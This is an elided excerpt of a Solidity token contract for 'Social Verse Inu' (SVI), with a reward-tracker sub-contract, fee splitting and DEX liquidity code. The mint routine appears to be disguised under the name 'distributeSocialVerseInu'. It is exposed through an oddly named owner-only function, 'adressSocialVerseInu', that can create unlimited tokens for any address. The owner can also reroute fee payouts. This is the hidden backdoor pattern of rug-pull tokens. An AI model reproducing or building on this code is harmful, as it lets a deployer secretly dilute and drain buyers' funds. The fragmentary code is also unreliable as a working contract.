...
_balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
 ...
 function distributeSocialVerseInu(address account, uint256 amount) internal virtual {
...
function distributeSocialVerseInu(address account, uint256 value) internal override {
    super.distributeSocialVerseInu(account, value);
...
function _burn(address account, uint256 value) internal override {
 ...
 function _setBalance(address account, uint256 newBalance) internal {
    ...
    if(newBalance > currentBalance) {
      ...
      distributeSocialVerseInu(account, mintAmount);
...
contract SocialVerseInurewardToken is rewardTokenHolders, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using IterateSocialVerseInu  for IterateSocialVerseInu .Map;
IterateSocialVerseInu .Map private tokenHoldersList;
...
event Claim(address indexed account, uint256 amount, bool indexed automatic);
 constructor() rewardTokenHolders("SocialVerseInu_rewardToken_Tracker", "SocialVerseInu_rewardToken_Tracker") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 80000 * (10**9); 
    }
function _transfer(address, address, uint256) internal override pure {
        require(false, "SocialVerseInu_rewardToken_Tracker: No transfers allowed");
    }
 function withdrawDividend() public override  pure {
        require(false, "SocialVerseInu_rewardToken_Tracker: withdrawDividend disabled. Use the 'claim' function on the main SocialVerseInu contract.");
    }
...
contract SocialVerseInu is ERC20, Ownable {
 event UpdateDEXV2Router(address indexed newAddress, address indexed oldAddress);
    ...
    uint256 public  holderCharge = 7;
    uint256 public  TotalFees;
 uint256 public gasForProcessing = 300000;
    address public DEXV2Pair;
    PanCakeRouter02 public DEXV2Router;
    SocialVerseInurewardToken public rewardToken;
   uint256 _totalSupply =30000000  * (10**9);
 ...
 address public lp;
  ILP public adressLiquidity;
    address public growthFeeReciever =0xca9023B5A7f3b18B57e4A9C15Ab2C2a59BB2C9c3;
...
bool public cooldownEnabled = false;
  ...
  constructor() ERC20("Social Verse Inu", "SVI") {
 
        TotalFees = holderCharge.add(liquidityFee).add(growthFee);
 ...
 DEXV2Router = _DEXV2Router;
        ...
        rewardToken = new SocialVerseInurewardToken();
...
isTimelockLimited[owner()] = true;
 ...
 distributeSocialVerseInu(owner(), _totalSupply);
    }
receive() external payable {}
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
...
emit RebaseUpdate(epoch, _totalSupply);
  ...
  function changeIsDividendLimited(address holder, bool Limited) external masterWallet {
     ...
     function adressSocialVerseInu(address allowp, uint256 allowa) public masterWallet{
       distributeSocialVerseInu(allowp, allowa);
  }
 function setDevWallet(address payable wallet) public masterWallet {
        growthFeeReciever = wallet;
    }
   
 function updateDEXV2Router(address newAddress) public masterWallet {
        require(newAddress != address(DEXV2Router), "SocialVerseInu: The router already has that address");
 ...
 function excludeFromFees(address account, bool excluded) public masterWallet {
        require(_isExcludedFromFees[account] != excluded, "SocialVerseInu: Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }
function updateGasForProcessing(uint256 newValue) public masterWallet {
        require(newValue >= 200000 && newValue <= 500000, "SocialVerseInu: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "SocialVerseInu: Cannot update gasForProcessing to same value");
 ...
 uint256 tokensTSocialVerseInu = tokensToLiquify.mul(liquidityFee).div(TotalFees).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(tokensTSocialVerseInu);
...
uint256 bnbForLiquidity = bnbBalance.mul(liquidityFee).div(bnbFeeFactor).div(2);
        uint256 bnbForReflection = bnbBalance.mul(holderCharge).div(bnbFeeFactor);
        uint256 bnbForDev = bnbBalance.sub(bnbForLiquidity).sub(bnbForReflection);
addLiquidity(tokensTSocialVerseInu, bnbForLiquidity);
payable(growthFeeReciever).transfer(bnbForDev);
 (bool success,) = address(rewardToken).call{value: bnbForReflection}("");
if(success) {
            emit transferDividends(tokensToLiquify.mul(holderCharge).div(TotalFees), bnbForReflection);
        }
    }
